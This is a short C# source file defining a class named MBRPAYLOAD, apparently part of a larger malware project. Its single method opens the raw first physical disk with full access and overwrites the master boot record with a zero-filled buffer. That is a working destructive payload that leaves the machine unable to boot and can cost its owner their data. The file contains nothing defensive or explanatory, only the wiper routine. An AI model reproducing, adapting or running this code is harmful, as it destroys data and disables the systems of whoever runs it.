﻿using Cluttscape_tutorial;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace GKDI
{
    internal class MBRPAYLOAD
    {
        public void MBR_START()
        {
            var mbrData = new byte[dport.MbrSize];
            var mbr = dport.CreateFile("\\\\.\\PhysicalDrive0", dport.GenericAll, dport.FileShareRead | dport.FileShareWrite,
            IntPtr.Zero, dport.OpenExisting, 0, IntPtr.Zero);
            dport.WriteFile(mbr, mbrData, dport.MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}
